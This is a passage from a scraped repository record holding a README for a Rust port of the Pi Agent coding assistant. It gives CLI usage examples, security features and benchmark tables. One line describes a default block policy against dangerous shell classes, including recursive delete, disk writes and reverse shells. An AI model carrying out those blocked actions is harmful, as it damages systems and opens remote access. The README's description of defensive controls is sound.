McGugan](https://github.com/willmcgugan), providing beautiful terminal output with markup syntax\n\n```bash\n# Start a session\npi \"Help me refactor this function to use async/await\"\n\n# Continue a previous session\npi --continue\n\n# Single-shot mode (no session)\npi -p \"What does this error mean?\" < error.log\n```\n\n## Why Should You Care?\n\nIf you already use Pi Agent, especially through OpenClaw, this project keeps the core workflow while upgrading the engine under the hood:\n\n- **Substantially faster in realistic end-to-end flows** (not synthetic microbenchmarks)\n- **Dramatically smaller memory footprint** in long-running sessions\n- **Materially stronger security model** for extension/tool execution, including command-level blocking of dangerous extension shell patterns\n\nSecurity is a first-class design goal here, not a bolt-on:\n\n- Capability-gated hostcalls (`tool`/`exec`/`http`/`session`/`ui`/`events`)\n- Two-stage extension `exec` enforcement: capability gate first, then command mediation that blocks critical shell classes by default (for example recursive delete, disk/device writes, reverse shell) and can tighten to block high-tier classes in strict/safe policy\n- Policy + runtime risk + quota enforcement on the execution path\n- Per-extension trust lifecycle (`pending` -> `acknowledged` -> `trusted` -> `killed`) with kill-switch audit logs and explicit operator provenance\n- Hostcall-lane emergency controls that can force compatibility-lane execution globally or for one extension when fast-lane behavior needs immediate containment\n- Structured concurrency via `asupersync` for more predictable cancellation/lifecycle behavior\n- Auditable runtime signals/ledgers and redacted security alerts for extension behavior\n\n## TL;DR (Pi/OpenClaw Users)\n\nThese are the realistic secure-path numbers that matter most (large-session, end-to-end behavior):\n\n| Scenario | Rust total | Legacy Node total | Legacy Bun total | Rust advantage |\n|---|---:|---:|---:|---:|\n| Realistic 1M session | 250.29 ms | 1,238.67 ms | 700.52 ms | `4.95x` faster than Node, `2.80x` faster than Bun |\n| Realistic 5M session | 1,382.12 ms | 5,974.67 ms | 2,959.42 ms | `4.32x` faster than Node, `2.14x` faster than Bun |\n\n| Scenario | Rust RSS | Legacy Node RSS | Legacy Bun RSS | Rust memory advantage |\n|---|---:|---:|---:|---:|\n| Realistic 1M session | 67,572 KB | 820,380 KB | 875,092 KB | `12.14x` lower than Node",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:26:09.084400"
  }
]